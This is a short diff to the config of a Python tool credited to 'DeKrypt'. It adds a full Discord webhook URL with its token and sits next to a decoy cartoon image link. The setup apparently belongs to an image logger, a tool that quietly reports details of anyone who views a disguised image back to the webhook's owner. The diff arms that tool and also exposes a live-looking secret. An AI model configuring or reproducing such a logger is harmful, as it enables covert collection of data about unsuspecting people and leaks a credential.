@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
+    "webhook": "https://discord.com/api/webhooks/1398958101066944562/4w5Rm6DePPPqdHI_sEC2HHx_jlDH1zIuDP1yf5vjyrk5D7VImvqlAH_3ooKrdo1Om_jo",
     "image": "https://static.wikia.nocookie.net/sonic-battle/images/4/42/Sonic_Battle_-_Sonic.png",
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
